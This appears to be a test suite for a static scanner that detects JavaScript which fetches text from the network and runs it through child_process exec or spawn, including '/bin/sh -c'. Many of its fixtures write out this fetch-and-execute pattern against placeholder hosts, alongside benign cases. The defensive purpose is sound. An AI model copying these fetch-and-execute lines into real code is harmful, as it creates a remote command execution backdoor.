import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { findNetworkExecution } from '../src/scanner/content-network-signals.js';
import { tokenizeSource } from '../src/scanner/source-tokens.js';

const find = (source: string) => findNetworkExecution(source, tokenizeSource(source));
const response = `const response = await fetch('https://example.test/tool'); const body = await response.text();`;

describe('connected network execution signals', () => {
  it('requires response command data, rather than incidental network/process capabilities', () => {
    assert.equal(find(`const {exec}=require('child_process');fetch('https://example.test/tool');exec('tool');`), undefined);
    assert.ok(find(`const {exec}=require('child_process');${response}exec(body);`));
  });

  it('tracks copies, qualified fetch, direct response bodies, and imported process aliases', () => {
    assert.ok(find(`const cp=require('node:child_process');${response}const command=body;cp.execSync(command);`));
    assert.ok(find(`import {exec as run} from 'node:child_process';run(await (await globalThis.fetch('/command')).text());`));
    assert.ok(find(`require('child_process').exec(await (await fetch('/command')).text());`));
    assert.ok(find(`import * as cp from 'child_process';${response}cp.exec('prefix '+body);`));
  });

  it('recognizes response command text passed to an explicit shell -c', () => {
    assert.ok(find(`const cp=require('child_process');${response}cp.spawn('/bin/sh',['-c',body]);`));
    assert.equal(find(`const cp=require('child_process');${response}cp.spawn('renderer',[body]);`), undefined);
    assert.equal(find(`const cp=require('child_process');${response}cp.spawn('sh',['-c','echo ok']);`), undefined);
  });

  it('clears overwritten bodies and process aliases instead of preserving stale data', () => {
    assert.equal(find(`const cp=require('child_process');${response}body='fixed';cp.exec(body);`), undefined);
    assert.equal(find(`let cp=require('child_process');${response}cp=logger;cp.exec(body);`), undefined);
  });

  it('does not apply unused function writes to the enclosing process/body bindings', () => {
    for (const overwrite of ['cp=console;', 'cp.exec=console.log;', "cp['exec']=console.log;", "body='echo safe';"]) {
      assert.ok(find(`let cp=require('child_process');${response}function unused(){${overwrite}}cp.exec(body);`), overwrite);
    }
    assert.equal(find(`let cp=require('child_process');${response}{cp=console;}cp.exec(body);`), undefined);
    assert.equal(find(`let cp=require('child_process');${response}{body='fixed';}cp.exec(body);`), undefined);
  });

  it('does not apply object-property writes to same-named lexical body/process bindings', () => {
    assert.ok(find(`const cp=require('child_process');${response}const other={};other.body='echo safe';cp.exec(body);`));
    assert.equal(find(`const cp=require('child_process');${response}const command='echo safe';const other={};other.command=body;cp.exec(command);`), undefined);
    assert.equal(find(`${response}const other={};other.cp=require('child_process');cp.exec(body);`), undefined);
  });

  it('isolates expression-arrow writes while retaining connected calls inside their bodies', () => {
    for (const overwrite of ['cp=console', 'cp.exec=console.log', "body='echo safe'"]) {
      assert.ok(find(`let cp=require('child_process');${response}const unused=()=>${overwrite};cp.exec(body);`), overwrite);
    }
    assert.equal(find(`const cp=require('child_process');${response}let command='echo safe';const unused=()=>command=body;cp.exec(command);`), undefined);
    assert.ok(find(`const cp=require('child_process');${response}const sample=()=>cp.exec(body);`));
  });

  it('honors var process aliases hoisted within a function even when declared in a block', () => {
    for (const statements of [
      `if(true){var cp=console;}${response}cp.exec(body);`,
      `${response}cp.exec(body);if(true){var cp=console;}`,
    ]) assert.equal(find(`const cp=require('child_process');function sample(){${statements}}`), undefined);
  });

  it('honors local process, require and fetch parameters', () => {
    assert.equal(find(`const cp=require('child_process');function inspect(cp){${response}cp.exec(body);}`), undefined);
    assert.equal(find(`function inspect(require){const cp=require('child_process');${response}cp.exec(body);}`), undefined);
    assert.equal(find(`const cp=require('child_process');function inspect(fetch){${response}cp.exec(body);}`), undefined);
    assert.equal(find(`const {exec}=require('child_process');function inspect(){const {exec}=logger;${response}exec(body);}`), undefined);
    assert.equal(find(`const cp=require('child_process');cp.exec=logger;${response}cp.exec(body);`), undefined);
  });

  it('does not treat nested object properties as local process aliases', () => {
    assert.equal(find(`const cp=require('child_process');async function work(){${response}const worker={cp:{exec(s){return s}}};worker.cp.exec(body);}`), undefined);
    assert.equal(find(`const {exec:run}=require('child_process');${response}const worker={run(s){return s}};worker.run(body);`), undefined);
    assert.equal(find(`const worker={require(){return {exec(s){return s}}}};${response}worker.require('child_process').exec(body);`), undefined);
  });

  it('respects hoisted and temporal-dead-zone require bindings', () => {
    assert.equal(find(`function run(){const cp=require('child_process');async function work(){${response}cp.exec(body);}function require(){return {exec:console.log}}}`), undefined);
    assert.equal(find(`function run(){const cp=require('child_process');${response}cp.exec(body);const require=fake;}`), undefined);
    assert.ok(find(`const cp=require('child_process');${response}cp.exec(body);function unrelated(require){return require('example');}`));
  });

  it('does not join data from independent functions or sibling blocks', () => {
    assert.equal(find(`const cp=require('child_process');function download(){${response}}function build(){cp.exec(body);}`), undefined);
    assert.equal(find(`const cp=require('child_process');{${response}}{cp.exec(body);}`), undefined);
  });

  it('leaves ordinary installers, telemetry and download-to-file flows outside this narrow signal', () => {
    assert.equal(find(`const cp=require('child_process');async function download(){${response}fs.writeFileSync('tool',body);}function check(){cp.execSync('tool --version');}`), undefined);
    assert.equal(find(`const cp=require('child_process');${response}console.log(body);cp.execSync('node --version');`), undefined);
    assert.equal(find(`const cp=require('child_process');${response}fs.writeFileSync('tool',body);cp.execFileSync('tool');`), undefined);
  });

  it('ignores documentation strings, comments, regex and opaque templates', () => {
    const code = `const cp=require('child_process');${response}cp.exec(body);`;
    assert.equal(find(`const guide=${JSON.stringify(code)};`), undefined);
    assert.equal(find(`/* ${code} */`), undefined);
    assert.equal(find('const guide = `require("child_process").exec(fetch("tool"))`;'), undefined);
    assert.equal(find(String.raw`const guide=/fetch\(\).*exec\(/;`), undefined);
  });

  it('accepts automatic semicolon boundaries and keeps useful source offsets', () => {
    const source = `const cp=require('child_process')\nconst r=await fetch('/command')\nconst body=await r.text()\ncp.exec(body)`;
    const signal = find(source);
    assert.ok(signal);
    assert.equal(source.slice(signal.start, signal.end), 'cp.exec(body)');
  });
});
